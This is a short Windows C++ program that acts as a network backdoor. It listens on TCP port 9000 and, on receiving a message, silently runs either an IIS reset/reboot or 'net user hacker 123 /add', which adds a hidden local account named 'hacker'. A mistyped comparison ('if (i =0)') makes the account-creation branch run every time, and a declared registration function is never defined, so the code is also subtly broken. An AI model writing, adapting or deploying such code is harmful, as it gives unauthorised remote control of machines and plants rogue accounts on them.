// Server.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#include <string.h>

#pragma comment(lib,"ws2_32.lib")
BOOL reg(char *szExecFile);
char Buff[2048]; 

int main(int argc,char argv[]) 
{ 
	WSADATA wsa; 
	SOCKET listenFD; 
	WSAStartup(MAKEWORD(2,2),&wsa);            

	listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); 
	struct sockaddr_in server; 
	server.sin_family = AF_INET; 
	server.sin_port = htons(9000); 
	server.sin_addr.s_addr=ADDR_ANY; 

	bind(listenFD,(sockaddr *)&server,sizeof(server)); 
	printf("\nBind is ok!");
	listen(listenFD,2); 
	printf("\nListen is Ok!");

	int iAddrSize = sizeof(server); 
	SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize); 
	printf("\n Accept a connect in ");
	recv(clientFD,Buff,1024,0); 
	int i=strcmp(Buff,"reset");	
		if (i =0)
				{
					WinExec("iisreset/reboot",SW_HIDE);
				}
			else
				{
					WinExec("net user hacker 123 /add",SW_HIDE);
				}
	WSACleanup(); 
	return 0; 
}
